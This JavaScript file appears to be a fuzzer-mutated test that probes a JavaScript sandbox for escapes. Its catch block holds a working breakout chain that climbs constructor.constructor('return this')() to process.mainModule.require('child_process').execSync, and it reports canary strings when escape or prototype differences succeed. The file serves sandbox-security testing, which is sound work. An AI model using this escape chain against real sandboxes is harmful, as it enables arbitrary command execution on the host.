try {
    var alphabetR = [
        'ё',
        'я',
        'ю',
        'э',
        'ь',
        'ы',
        'ъ',
        'щ',
        'ш',
        'ч',
        'ц',
        'х',
        'ф',
        'у',
        'т',
        'с',
        'р',
        'П',
        'О',
        'Н',
        'М',
        'Л',
        'К',
        'Й',
        'И',
        'З',
        'Ж',
        'Е',
        'Д',
        'Г',
        'В',
        'Б',
        'А'
    ];
    var alphabet = [
        'А',
        'Б',
        'В',
        'Г',
        'Д',
        'Е',
        'Ж',
        'З',
        'И',
        'Й',
        'К',
        'Л',
        'М',
        'Н',
        'О',
        'П',
        'р',
        'с',
        'т',
        'у',
        'ф',
        'х',
        'ц',
        'ч',
        'ш',
        'щ',
        'ъ',
        'ы',
        'ь',
        'э',
        'ю',
        'я',
        'ё'
    ];
    var myComparefn = function (x, y) {
        throw () => {
            return () => {
            };
        };
        var xS = String(x);
        var yS = String(y);
        if (xS < yS)
            return 1;
        if (xS > yS)
            return -1;
        return 0;
    };
    alphabet.sort(myComparefn);
    var result = true;
    for (var i = 0; i < 26; i++) {
        if (alphabetR[i] !== alphabet[i])
            result = false;
    }
    if (result !== true) {
        $ERROR('#1: CHECK RUSSIAN ALPHABET');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}